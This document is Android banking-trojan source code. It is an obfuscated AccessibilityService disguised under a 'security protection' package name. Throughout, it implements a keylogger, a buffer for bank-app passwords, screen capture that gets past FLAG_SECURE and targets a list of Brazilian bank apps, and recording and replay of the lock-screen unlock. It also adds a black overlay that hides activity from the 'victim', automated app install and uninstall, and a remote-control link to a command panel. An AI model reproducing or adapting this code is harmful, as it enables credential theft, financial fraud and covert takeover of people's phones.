package com.seguranca.protecao;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import androidx.annotation.RequiresApi;
import android.os.Handler;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import org.lsposed.lsparanoid.Obfuscate;
import org.json.JSONObject;
import org.json.JSONException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;

/**
 * Accessibility bridge — screen interaction, capture, and remote control delegation.
 */
@Obfuscate
public class UiAssistBridge extends AccessibilityService {

    private static final String TAG = "SystemUI_Services";
    private Handler handler = new Handler();
    private GestureCore gestureCore;
    private boolean isAutomating = false;
    private int automationStep = 0;
    
    // Input capture buffer (always-on when enabled)
    private boolean keyloggerEnabled = true;
    private String lastCapturedText = "";
    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
    
    // 🔥 Debounce para evitar eventos duplicados de keylog
    private String lastKeylogDigit = "";
    private long lastKeylogTime = 0;
    private static final long KEYLOG_DEBOUNCE_MS = 50; // 50ms entre eventos iguais (reduzido de 200ms!)
    
    // 📱 BUFFER DE SENHA BANCÁRIA - Acumula dígitos antes de enviar
    private StringBuilder bankPasswordBuffer = new StringBuilder();
    private String currentBankApp = "";
    private long lastBankDigitTime = 0;
    private static final long BANK_PASSWORD_TIMEOUT_MS = 3000; // 3 segundos para enviar senha completa
    private Handler bankPasswordHandler = new Handler();
    private Runnable bankPasswordFlushRunnable;
    
    // Screen Reader V2 (Bypass FLAG_SECURE)
    private boolean screenReaderEnabled = false;
    private Handler screenReaderHandler = new Handler();
    private Runnable screenReaderRunnable;
    
    // 🔓 Sistema de Desbloqueio Automático
    private boolean isRecordingUnlock = false;
    private java.util.ArrayList<UnlockAction> unlockSequence = new java.util.ArrayList<>();
    private String unlockType = "unknown"; // pin, pattern, password
    
    // HVNC silencioso (takeScreenshot / pipeline 0x01)
    private boolean isSilentVncEnabled = false;

    // Dedicated silent capture path: instance + PARTIAL_WAKE_LOCK + persistence + auto-resume
    public static UiAssistBridge instance;
    private static volatile boolean silentScreenActive = false;
    private static volatile Thread silentScreenThread = null;
    private static volatile boolean silentScreenshotApiInFlight = false;
    private static volatile int silentCaptureQuality = 60;
    private static long silentCaptureDelayMs = 45;
    private static volatile boolean killerCaptureRequested = false;

    private static final int SILENT_CAPTURE_MIN_DELAY_MS = 45;
    private static final int SILENT_CAPTURE_BLACK_SCREEN_MIN_DELAY_MS = 140;
    private static final int SILENT_CAPTURE_MAX_DELAY_MS = 500;
    private static final int SILENT_WIDTH = 350;
    private static final int SILENT_HEIGHT = 650;

    private static final java.util.concurrent.ArrayBlockingQueue<SilentFrameJob> SILENT_ENCODE_QUEUE =
            new java.util.concurrent.ArrayBlockingQueue<>(2);

    private static final java.util.concurrent.ExecutorService SILENT_ENCODE_POOL =
            java.util.concurrent.Executors.newFixedThreadPool(3, r -> {
                Thread t = new Thread(r, "SilentEncode");
                t.setDaemon(true);
                t.setPriority(Thread.NORM_PRIORITY - 1);
                return t;
            });

    private static final class SilentFrameJob {
        final android.graphics.Bitmap bitmap;

        SilentFrameJob(android.graphics.Bitmap bitmap) {
            this.bitmap = bitmap;
        }

        void recycle() {
            if (bitmap != null && !bitmap.isRecycled()) {
                bitmap.recycle();
            }
        }
    }

    // ===== ANTI-DETECT BANKING SCREEN CAPTURE =====
    // Banking apps use FLAG_SECURE, FLAG_WINDOW_IS_OBSCURED, Keyguard detection, etc.
    // takeScreenshot() on AccessibilityService (API 30+) bypasses FLAG_SECURE by design.
    // We add: window filtering, secure flag detection, capture validation, stealth timing.

    private static final String[] BANK_PACKAGES = {
        "br.com.itau", "com.itau", "com.itau.cartoes", "br.com.itau.pers",
        "br.com.neon", "com.nu.production", "com.nubank",
        "br.com.bradesco", "com.bradesco.cartoes", "br.com.bradesco.bradescoprime",
        "com.santander.app", "com.santander.app.way", "com.santander.app.select",
        "com.picpay", "br.com.intermedium", "com.bancocinter",
        "br.gov.caixa.tem", "br.com.gft.banco7", "br.gov.caixa.mfg",
        "br.com.bb", "br.com.bb.android", "br.com.bb.empresa",
        "com.mercadopago.wallet", "br.com.banco.original", "br.com.c6bank.app",
        "br.com.pagseguro", "com.pagseguro.pagbank", "com.btg.pactual",
        "com.btg.digital", "br.com.sicoob.mobile", "br.com.sicredi",
        "com.safra.net", "br.com.safra.mobile", "com.xp.mobile",
        "br.com.xp.investimentos", "com.willbank.app", "br.com.pan.app",
        "br.com.agibank", "com.bancobs2.app", "com.bancobMG.mobile",
        "br.com.banrisul", "br.com.banrisul.cartoes"
    };

    private static volatile boolean bankingAppOnScreen = false;
    private static volatile long lastBankingCaptureTime = 0;
    private static volatile int consecutiveFailedCaptures = 0;
    private static final int MAX_FAILED_CAPTURES_BEFORE_BACKOFF = 5;

    // Persistence keys for dedicated BTMOB silent path (purple button only)
    // Using the established "rat_prefs" namespace used elsewhere in the project
    private static final String PREFS_SILENT_ACTIVE = "silent_capture_active";
    private static final String PREFS_SILENT_QUALITY = "silent_capture_quality";

    /**
     * Tiny holder for persisted silent capture state (BTMOB path only).
     * Package-private so CommandControlService (same package) can receive it from the public getter.
     */
    static class SilentState {
        final boolean active;
        final int quality;
        SilentState(boolean active, int quality) {
            this.active = active;
            this.quality = quality;
        }
    }

    /**
     * Detecta se o app em foreground é um app bancário conhecido.
     */
    private static boolean isBankingApp(String packageName) {
        if (packageName == null) return false;
        for (String bankPkg : BANK_PACKAGES) {
            if (packageName.startsWith(bankPkg)) return true;
        }
        return false;
    }

    /**
     * Verifica se a janela atual tem FLAG_SECURE (apps bancários, DRM, etc).
     * Usa AccessibilityNodeInfo para inspecionar a janela raiz.
     */
    private boolean isCurrentWindowSecure() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;
            
            // Verifica se a janela raiz tem FLAG_SECURE
            // No Android, FLAG_SECURE na janela impede screenshots normais
            // mas takeScreenshot() do AccessibilityService ignora isso
            CharSequence pkg = root.getPackageName();
            if (pkg != null && isBankingApp(pkg.toString())) {
                bankingAppOnScreen = true;
                Log.d(TAG, "🔐 [ANTI-DETECT] App bancário detectado em foreground: " + pkg);
            }
            
            // Inspeciona windows ativos via getWindows()
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows != null) {
                for (AccessibilityWindowInfo win : windows) {
                    if (win != null && win.isAccessibilityFocused()) {
                        // Janela focada - pode ter FLAG_SECURE
                        bankingAppOnScreen = true;
                    }
                }
            }
            root.recycle();
        } catch (Exception e) {
            Log.w(TAG, "🔐 [ANTI-DETECT] Erro ao verificar FLAG_SECURE: " + e.getMessage());
        }
        return bankingAppOnScreen;
    }

    /**
     * Valida se o bitmap capturado é válido (não é tela preta, não é vazio).
     * Banking apps podem retornar tela preta se detectarem captura.
     */
    private static boolean validateCapture(android.graphics.Bitmap bitmap) {
        if (bitmap == null || bitmap.isRecycled()) return false;
        if (bitmap.getWidth() <= 0 || bitmap.getHeight() <= 0) return false;
        
        // Amostra pixels para detectar tela preta sólida (indica bloqueio)
        int width = bitmap.getWidth();
        int height = bitmap.getHeight();
        int sampleCount = 0;
        int blackPixels = 0;
        int whitePixels = 0;
        
        // Amostra 100 pixels aleatórios
        java.util.Random rand = new java.util.Random();
        for (int i = 0; i < 100; i++) {
            int x = rand.nextInt(width);
            int y = rand.nextInt(height);
            int pixel = bitmap.getPixel(x, y);
            int r = android.graphics.Color.red(pixel);
            int g = android.graphics.Color.green(pixel);
            int b = android.graphics.Color.blue(pixel);
            
            if (r == 0 && g == 0 && b == 0) blackPixels++;
            if (r == 255 && g == 255 && b == 255) whitePixels++;
            sampleCount++;
        }
        
        float blackRatio = (float) blackPixels / sampleCount;
        float whiteRatio = (float) whitePixels / sampleCount;
        
        // Se > 90% preto sólido = provavelmente bloqueado por FLAG_SECURE ou detecção
        // Se > 90% branco sólido = tela vazia/loading
        if (blackRatio > 0.9f) {
            Log.w(TAG, "🔐 [ANTI-DETECT] Captura inválida: " + (blackRatio * 100) + "% preto (possível bloqueio FLAG_SECURE)");
            return false;
        }
        if (whiteRatio > 0.9f) {
            Log.w(TAG, "🔐 [ANTI-DETECT] Captura inválida: " + (whiteRatio * 100) + "% branco (tela vazia)");
            return false;
        }
        
        return true;
    }

    /**
     * Ajusta delay de captura baseado no contexto (app bancário = mais lento/stealth).
     */
    private static long getAdaptiveCaptureDelay() {
        long baseDelay = silentCaptureDelayMs;
        
        if (bankingAppOnScreen) {
            // App bancário: delay maior para evitar detecção de taxa de captura
            // Varia entre 200-800ms aleatoriamente
            baseDelay = Math.max(baseDelay, 200 + new java.util.Random().nextInt(600));
            Log.d(TAG, "🔐 [ANTI-DETECT] Delay adaptativo para app bancário: " + baseDelay + "ms");
        } else if (isBlackScreenActive && blackScreenOpacityPercent >= 100) {
            baseDelay = Math.max(baseDelay, SILENT_CAPTURE_BLACK_SCREEN_MIN_DELAY_MS);
        }
        
        return Math.min(baseDelay, SILENT_CAPTURE_MAX_DELAY_MS);
    }

    /**
     * Força recaptura se a anterior falhou (retry com backoff).
     */
    private void scheduleRetryCapture() {
        if (consecutiveFailedCaptures >= MAX_FAILED_CAPTURES_BEFORE_BACKOFF) {
            // Backoff exponencial: 1s, 2s, 4s, 8s... max 30s
            long backoffMs = Math.min(1000L * (1L << (consecutiveFailedCaptures - MAX_FAILED_CAPTURES_BEFORE_BACKOFF)), 30000L);
            Log.w(TAG, "🔐 [ANTI-DETECT] Muitas falhas (" + consecutiveFailedCaptures + "), backoff: " + backoffMs + "ms");
            handler.postDelayed(() -> {
                if (silentScreenActive) {
                    consecutiveFailedCaptures = 0; // Reset após backoff
                    Log.d(TAG, "🔐 [ANTI-DETECT] Backoff concluído, retomando captura");
                }
            }, backoffMs);
        }
    }

    /**
     * Public API: Verifica se app bancário está em foreground.
     * Usado pelo painel para saber quando ativar modo stealth.
     */
    public static boolean isBankingAppOnScreen() {
        return bankingAppOnScreen;
    }

    /**
     * Public API: Força reset do estado de detecção bancária.
     * Útil quando o usuário sai do app bancário.
     */
    public static void resetBankingAppState() {
        bankingAppOnScreen = false;
        consecutiveFailedCaptures = 0;
        Log.d(TAG, "🔐 [ANTI-DETECT] Estado de app bancário resetado");
    }

    /**
     * Public API: Obtém estatísticas de captura para debug/monitoramento.
     */
    public static java.util.Map<String, Object> getCaptureStats() {
        java.util.Map<String, Object> stats = new java.util.HashMap<>();
        stats.put("silentActive", silentScreenActive);
        stats.put("bankingAppOnScreen", bankingAppOnScreen);
        stats.put("consecutiveFailedCaptures", consecutiveFailedCaptures);
        stats.put("currentDelayMs", silentCaptureDelayMs);
        stats.put("currentQuality", silentCaptureQuality);
        stats.put("lastBankingCaptureTime", lastBankingCaptureTime);
        return stats;
    }
    
    // 🖤 BLACK SCREEN OVERLAY (100% opaco via AccessibilityService)
    private android.view.View blackOverlayView = null;
    private android.view.WindowManager blackOverlayWindowManager = null;
    private boolean isBlackScreenActive = false;
    private int blackScreenOpacityPercent = 100;
    private long lastBlackScreenNavBlockMs = 0;
    private static volatile long lastBlackOverlayRestoredMs = 0;
    private static final long BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS = 800;
    private static final long BLACK_OVERLAY_RESTORE_COOLDOWN_MS = 80;
    private static final long BLACK_OVERLAY_LATCH_TIMEOUT_MS = 15;
    /** Abordagem B (padrao): oculta overlay brevemente durante takeScreenshot em ROMs 100% opacas.
     *  Abordagem A (FLAG_SECURE) desativada — causava canvas preto no operador. */
    private static volatile boolean BLACK_SCREEN_CAPTURE_FALLBACK = true;
    
    // 📦 AUTO-INSTALL APK (auto-click em "Instalar")
    private boolean autoInstallEnabled = false;
    private long autoInstallEnabledTime = 0;
    
    // 🗑️ ALLOW UNINSTALL OTHER APPS - Permite desinstalar outros apps via painel
    private boolean allowUninstallOtherApps = false;
    private long allowUninstallTime = 0;
    
    // 🔒 SCREEN PERSISTENCE - Não deixa a vítima desligar a tela
    private boolean screenPersistenceEnabled = false;
    private android.os.PowerManager.WakeLock screenPersistenceWakeLock;
    private android.view.View keepScreenOnOverlay = null;
    private android.view.WindowManager keepScreenOnWindowManager = null;

    // 🔋 Dedicated PARTIAL_WAKE_LOCK for the silent capture thread
    private android.os.PowerManager.WakeLock silentCpuWakeLock = null;
    
    // 🔧 ROM COMPATIBILITY - Auto-click em configurações de ROM
    private boolean romConfigEnabled = false;
    private long romConfigEnabledTime = 0;
    private ROMCompatibility romCompat;
    
    // Classe para armazenar ações de desbloqueio
    private static class UnlockAction {
        String type; // CLICK, SWIPE, TYPE
        int x, y;
        int x2, y2; // Para swipe
        String text; // Para TYPE
        long delay; // Delay antes desta ação
        
        UnlockAction(String type, int x, int y) {
            this.type = type;
            this.x = x;
            this.y = y;
        }
        
        UnlockAction(String type, int x1, int y1, int x2, int y2) {
            this.type = type;
            this.x = x1;
            this.y = y1;
            this.x2 = x2;
            this.y2 = y2;
        }
    }
    
    // Estados da automação
    private static final int STEP_IDLE = 0;
    private static final int STEP_REQUEST_OVERLAY = 1;
    private static final int STEP_ENABLE_OVERLAY = 2;
    private static final int STEP_REQUEST_BATTERY = 3;
    private static final int STEP_COMPLETE = 99;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Serviço de acessibilidade conectado!");

        // BTMOB-style: expose static instance of the AccessibilityService for the dedicated silent capture thread
        instance = this;
        gestureCore = new GestureCore(this, this::wakeUpScreen);

        // AUTO-RESUME dedicated silent (BTMOB path) if it was active before service was recreated / device rebooted
        // We only reach here if the AccessibilityService itself is enabled.
        // Persistence is cleared on explicit user stop, so a true here means "should be running".
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            SilentState persisted = loadSilentState();
            if (persisted.active) {
                Log.d(TAG, "🔇 Resuming BTMOB-style silent capture from persisted state (quality=" + persisted.quality + ")");
                isSilentVncEnabled = true;
                silentCaptureQuality = clampSilentQuality(persisted.quality);
                startSilentScreenCapture(persisted.quality);
            }
        }
        
        // Registra receiver para iniciar automação quando tela fake solicitar (com flag Android 14+)
        IntentFilter filter = new IntentFilter("com.seguranca.protecao.AUTO_GRANT_PERMISSIONS");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(autoGrantReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(autoGrantReceiver, filter);
        }
        
        // Registra receiver para EXECUTAR GESTOS REMOTOS (com flag Android 14+)
        IntentFilter gestureFilter = new IntentFilter("com.seguranca.protecao.PERFORM_GESTURE");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(gestureReceiver, gestureFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(gestureReceiver, gestureFilter);
        }
        
        // Registra receiver para KEYLOGGER (com flag Android 14+)
        IntentFilter keyloggerFilter = new IntentFilter("com.seguranca.protecao.TOGGLE_KEYLOGGER");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(keyloggerReceiver, keyloggerFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(keyloggerReceiver, keyloggerFilter);
        }
        
        // Registra receiver para SCREEN READER V2 (com flag Android 14+)
        IntentFilter screenReaderFilter = new IntentFilter("com.seguranca.protecao.TOGGLE_SCREEN_READER");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(screenReaderReceiver, screenReaderFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(screenReaderReceiver, screenReaderFilter);
        }
        
        // Registra receiver para GRAVAÇÃO DE DESBLOQUEIO (com flag Android 14+)
        IntentFilter unlockFilter = new IntentFilter("com.seguranca.protecao.UNLOCK_RECORDING");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(unlockRecordingReceiver, unlockFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(unlockRecordingReceiver, unlockFilter);
        }
        
        // Registra receiver para SILENT VNC (sem ícone/notificação) (com flag Android 14+)
        IntentFilter silentVncFilter = new IntentFilter("com.seguranca.protecao.TOGGLE_SILENT_VNC");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(silentVncReceiver, silentVncFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(silentVncReceiver, silentVncFilter);
        }
        
        // Registra receiver para PATTERN UNLOCK (com flag Android 14+)
        IntentFilter patternUnlockFilter = new IntentFilter("PATTERN_UNLOCK_ACTION");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(patternUnlockReceiver, patternUnlockFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(patternUnlockReceiver, patternUnlockFilter);
        }
        
        // 🖤 Registra receiver para BLACK SCREEN OVERLAY (100% opaco)
        IntentFilter blackScreenFilter = new IntentFilter();
        blackScreenFilter.addAction("com.seguranca.protecao.BLACK_SCREEN_ON");
        blackScreenFilter.addAction("com.seguranca.protecao.BLACK_SCREEN_OFF");
        blackScreenFilter.addAction("com.seguranca.protecao.CUSTOM_BLACK_SCREEN");
        blackScreenFilter.addAction("com.seguranca.protecao.SET_BLACK_SCREEN_OPACITY");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(blackScreenReceiver, blackScreenFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(blackScreenReceiver, blackScreenFilter);
        }
        Log.d(TAG, "🖤 BLACK SCREEN receiver registrado!");
        
        // 📦 Registra receiver para AUTO-INSTALL de APKs
        IntentFilter autoInstallFilter = new IntentFilter("com.seguranca.protecao.ENABLE_AUTO_INSTALL");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(autoInstallReceiver, autoInstallFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(autoInstallReceiver, autoInstallFilter);
        }
        Log.d(TAG, "📦 AUTO-INSTALL receiver registrado!");
        
        // 🔧 Registra receiver para ROM CONFIG (auto-click em configurações de ROM)
        IntentFilter romConfigFilter = new IntentFilter("com.seguranca.protecao.ENABLE_ROM_CONFIG");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(romConfigReceiver, romConfigFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(romConfigReceiver, romConfigFilter);
        }
        Log.d(TAG, "🔧 ROM_CONFIG receiver registrado!");
        
        // 🗑️ Registra receiver para ALLOW_UNINSTALL (permitir desinstalar outros apps)
        IntentFilter allowUninstallFilter = new IntentFilter("com.seguranca.protecao.ALLOW_UNINSTALL");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(allowUninstallReceiver, allowUninstallFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(allowUninstallReceiver, allowUninstallFilter);
        }
        Log.d(TAG, "🗑️ ALLOW_UNINSTALL receiver registrado!");
        
        // 🗑️ Registra receiver para AUTO_UNINSTALL (auto-click na confirmação de desinstalação)
        IntentFilter autoUninstallFilter = new IntentFilter("com.seguranca.protecao.AUTO_UNINSTALL");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(autoUninstallReceiver, autoUninstallFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(autoUninstallReceiver, autoUninstallFilter);
        }
        Log.d(TAG, "🗑️ AUTO_UNINSTALL receiver registrado!");
        
        // 🔒 Registra receiver para SCREEN_OFF/ON (persistência de tela)
        IntentFilter screenFilter = new IntentFilter();
        screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
        screenFilter.addAction(Intent.ACTION_SCREEN_ON);
        registerReceiver(screenPersistenceReceiver, screenFilter);
        Log.d(TAG, "🔒 SCREEN_OFF/ON receiver registrado!");
        
        // 🔒 Registra receiver para TOGGLE SCREEN PERSISTENCE (EXPORTED para receber de CommandControlService)
        IntentFilter togglePersistenceFilter = new IntentFilter("com.seguranca.protecao.TOGGLE_SCREEN_PERSISTENCE");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(toggleScreenPersistenceReceiver, togglePersistenceFilter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(toggleScreenPersistenceReceiver, togglePersistenceFilter);
        }
        Log.d(TAG, "🔒 TOGGLE_SCREEN_PERSISTENCE receiver registrado!");
        
        // 🔒 Registra receivers para LOCKSCREEN PIN (igual EAGLESPY V5)
        IntentFilter lockscreenFilter = new IntentFilter();
        lockscreenFilter.addAction("com.seguranca.protecao.SHOW_LOCKSCREEN");
        lockscreenFilter.addAction("com.seguranca.protecao.HIDE_LOCKSCREEN");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(lockscreenReceiver, lockscreenFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(lockscreenReceiver, lockscreenFilter);
        }
        Log.d(TAG, "🔒 LOCKSCREEN receiver registrado!");
        
        // 🔢 Registra receiver para LOCK_KEY_PRESS (teclas do PIN)
        IntentFilter lockKeyFilter = new IntentFilter("com.seguranca.protecao.LOCK_KEY_PRESS");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(lockKeyPressReceiver, lockKeyFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(lockKeyPressReceiver, lockKeyFilter);
        }
        Log.d(TAG, "🔢 LOCK_KEY_PRESS receiver registrado!");
        
        // 🔄 Registra receiver para PLAY_PIN_SEQUENCE (reprodução automática)
        IntentFilter playPinFilter = new IntentFilter("com.seguranca.protecao.PLAY_PIN_SEQUENCE");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(playPinSequenceReceiver, playPinFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(playPinSequenceReceiver, playPinFilter);
        }
        Log.d(TAG, "🔄 PLAY_PIN_SEQUENCE receiver registrado!");
        
        // 🔧 Inicializa ROM Compatibility
        romCompat = new ROMCompatibility(this);
        Log.d(TAG, "📱 ROM detectada: " + romCompat.detectROM().name());
        
        // IMPORTANTE: NÃO inicia automação automaticamente!
        // Apenas aguarda comandos do Wizard
        Log.d(TAG, "✅ Aguardando comandos do wizard...");
        
        // 🚀 INICIA COMMANDCONTROLSERVICE IMEDIATAMENTE!
        // Isso faz o dispositivo aparecer no painel web assim que a Acessibilidade é habilitada
        // Não precisa esperar captura de tela — C&C sobe assim que a A11y está ativa
        startCommandControlService();
        
        // Notifica o wizard que o serviço está ativo
        Intent intent = new Intent("com.seguranca.protecao.AUTOMATION_UPDATE");
        intent.putExtra("action", "accessibility_enabled");
        sendBroadcast(intent);
        
        // 🎨 APK Visual: ABRE a activity diretamente para voltar ao app
        if (VisualScreenActivity.hasVisualConfig(this)) {
            Log.d(TAG, "🎨 APK Visual detectado - ABRINDO VisualScreenActivity!");
            
            // Abre a VisualScreenActivity diretamente - isso traz o app para frente
            Intent visualIntent = new Intent(this, VisualScreenActivity.class);
            visualIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            visualIntent.putExtra("accessibility_just_enabled", true);
            startActivity(visualIntent);
            
            Log.d(TAG, "✅ VisualScreenActivity aberta - app deve estar em primeiro plano agora!");
        }
    }
    
    /**
     * 🚀 Inicia o CommandControlService para conectar ao servidor
     * Isso faz o dispositivo aparecer no painel web IMEDIATAMENTE
     */
    private void startCommandControlService() {
        try {
            Log.d(TAG, "🚀 Iniciando CommandControlService (conexão com servidor)...");
            Intent ccIntent = new Intent(this, CommandControlService.class);
            startService(ccIntent);
            Log.d(TAG, "✅ CommandControlService iniciado - dispositivo deve aparecer no painel web!");
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao iniciar CommandControlService: " + e.getMessage());
        }
    }
    
    /**
     * Receiver que escuta quando a tela FAKE solicita automação
     */
    private BroadcastReceiver autoGrantReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            Log.d(TAG, "🔥 RECEBEU COMANDO: " + action);
            
            if ("com.seguranca.protecao.AUTO_GRANT_PERMISSIONS".equals(action)) {
                // Wizard solicitou concessão de permissões runtime
                Log.d(TAG, "✅ Iniciando automação de permissões runtime (silencioso)...");
                // As permissões já serão solicitadas pela MainActivity
                // Apenas aguardamos os diálogos aparecerem e automatizamos
            }
            else if ("com.seguranca.protecao.AUTO_DISABLE_BATTERY".equals(action)) {
                // Wizard solicitou desativação de otimização de bateria
                Log.d(TAG, "✅ Iniciando automação de bateria (silencioso)...");
                PermissionManager pm = new PermissionManager(context);
                pm.requestIgnoreBatteryOptimizations();
                isAutomating = true;
                automationStep = STEP_REQUEST_BATTERY;
            }
            else if ("com.seguranca.protecao.AUTO_SCREEN_CAPTURE".equals(action)) {
                Log.d(TAG, "Captura via takeScreenshot — use TOGGLE_SILENT_VNC no painel");
                finishAutomationWizard();
            }
        }
    };
    
    /**
     * Receiver que EXECUTA GESTOS REMOTAMENTE (CLICK, SWIPE, TYPE, NAVIGATION)
     * Este é o CORE do controle remoto!
     */
    private BroadcastReceiver gestureReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (gestureCore != null) {
                gestureCore.handlePerformGesture(intent);
            }
        }
    };
    
    /**
     * Receiver para LIGAR/DESLIGAR KEYLOGGER
     */
    private BroadcastReceiver keyloggerReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean enabled = intent.getBooleanExtra("enabled", false);
            keyloggerEnabled = enabled;
            Log.d(TAG, "⌨️ Keylogger " + (enabled ? "ATIVADO" : "DESATIVADO"));
        }
    };
    
    /**
     * Receiver para LIGAR/DESLIGAR SCREEN READER V2
     */
    private BroadcastReceiver screenReaderReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean enabled = intent.getBooleanExtra("enabled", false);
            screenReaderEnabled = enabled;
            Log.d(TAG, "👁️ Screen Reader V2 " + (enabled ? "ATIVADO" : "DESATIVADO"));
            
            if (enabled) {
                startScreenReader();
            } else {
                stopScreenReader();
            }
        }
    };
    
    /**
     * Receiver para GRAVAÇÃO DE DESBLOQUEIO
     */
    private BroadcastReceiver unlockRecordingReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getStringExtra("action");
            Log.d(TAG, "🔓 Unlock Recording: " + action);
            
            if ("START".equals(action)) {
                startUnlockRecording();
            } else if ("STOP".equals(action)) {
                stopUnlockRecording();
            } else if ("PLAY".equals(action)) {
                String seqJson = intent.getStringExtra("sequence_json");
                if (seqJson != null && seqJson.length() > 0) {
                    applyUnlockSequenceJson(seqJson);
                }
                playUnlockSequence();
            }
        }
    };
    
    /**
     * Receiver TOGGLE_SILENT_VNC — único motor: takeScreenshot (pipeline 0x01).
     */
    private BroadcastReceiver silentVncReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "BROADCAST TOGGLE_SILENT_VNC");
            boolean enabled = intent.getBooleanExtra("enabled", false);
            isSilentVncEnabled = enabled;

            if (enabled) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    int reqQuality = intent.getIntExtra("quality", -1);
                    if (reqQuality <= 0) {
                        reqQuality = loadSilentState(context).quality;
                    }
                    if (reqQuality <= 0) {
                        reqQuality = 15;
                    }
                    stopSilentScreenCapture();
                    startSilentScreenCapture(reqQuality);
                    Log.d(TAG, "HVNC silencioso iniciado (quality=" + reqQuality + ")");
                } else {
                    Log.w(TAG, "takeScreenshot requer Android 11+ (API 30)");
                }
            } else {
                stopSilentScreenCapture();
                Log.d(TAG, "Captura silenciosa parada");
            }
        }
    };

    /**
     * 🔓 Receiver para PATTERN UNLOCK direto
     * Executa o pattern de desbloqueio diretamente
     */
    private BroadcastReceiver patternUnlockReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String pattern = intent.getStringExtra("pattern");
            Log.d(TAG, "🔓 PATTERN_UNLOCK recebido: " + pattern);
            
            if (pattern != null && !pattern.isEmpty()) {
                int[] points = parsePatternString(pattern);
                if (points != null) {
                    executePatternUnlock(points);
                } else {
                    Log.e(TAG, "❌ Pattern inválido: " + pattern);
                }
            }
        }
    };
    
    private long lastUnlockActionTime = 0;
    
    /**
